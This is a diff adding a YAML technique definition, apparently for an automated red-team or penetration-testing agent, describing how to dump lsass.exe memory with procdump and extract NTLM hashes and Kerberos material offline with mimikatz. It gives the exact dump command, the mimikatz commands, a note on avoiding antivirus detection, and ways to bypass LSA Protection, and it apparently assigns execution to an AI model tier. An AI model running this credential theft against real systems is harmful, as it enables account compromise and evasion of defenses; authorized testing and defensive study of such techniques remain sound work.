@@ -1,0 +1,33 @@
+name: lsass_procdump
+category: creds
+description: Dump lsass.exe memory with Sysinternals procdump — then offline mimikatz
+preconditions:
+- shell_obtained
+- is_local_admin
+- se_debug_privilege
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp
+parser: generic_parser
+expected_effects:
+- lsass_dump_obtained
+- ntlm_hashes_obtained
+- tgt_material_obtained
+- has_hash
+falsifier:
+  pattern: ACCESS_DENIED|RunAsPPL|LSA Protection|credential guard|defender detected
+  timeout: 60
+model_tier: sonnet
+mechanism: 'Signed Sysinternals binary → far less AV noise than mimikatz sekurlsa::logonpasswords.
+
+  Take the .dmp offline, run `mimikatz> sekurlsa::minidump lsass.dmp` then
+
+  `sekurlsa::logonpasswords`. RunAsPPL/LSA-Protection blocks this; bypass via
+
+  mimikatz !+/!processprotect or a signed driver.
+
+  '
+references:
+  ocd_mindmap: 'Branch 10: LSASS dump (procdump)'
+  hacktricks: windows-hardening/stealing-credentials/
+hacktricks_ref: windows-hardening/stealing-credentials/README.md
